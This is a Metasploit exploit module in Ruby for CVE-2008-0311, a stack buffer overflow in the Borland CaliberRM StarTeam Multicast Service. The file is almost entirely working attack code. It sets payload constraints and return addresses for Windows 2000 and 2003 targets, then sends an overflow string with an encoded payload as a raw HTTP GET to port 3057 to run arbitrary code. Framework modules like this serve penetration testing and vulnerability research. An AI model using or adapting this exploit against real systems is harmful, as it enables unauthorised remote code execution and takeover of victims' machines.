##
# $Id: borland_starteam.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Borland CaliberRM StarTeam Multicast Service Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Borland CaliberRM 2006. By sending
				a specially crafted GET request to the STMulticastService, an attacker may be
				able to execute arbitrary code.
			},
			'Author'         => 'MC',
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					[ 'CVE', '2008-0311' ],
					[ 'OSVDB', '44039' ],
					[ 'BID', '28602' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 SP4 English',     { 'Ret' => 0x7c5729db } ],
					[ 'Windows 2003 SP0 English',     { 'Ret' => 0x71ae1f9b } ],
				],
			'Privileged'     => true,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Apr 02 2008'))

		register_options([Opt::RPORT(3057)], self.class)
	end

	def exploit

		# inline payloads work best!
		sploit =  rand_text_english(511) + "\x00" + rand_text_english(1020)
		sploit << [target.ret].pack('V') + "@" * 156 # <- :(
		sploit << payload.encoded + rand_text_english(rand(100) + 1)

		print_status("Trying target #{target.name}...")

		send_request_raw({'uri' => sploit,}, 5)

		handler
		disconnect

	end

end
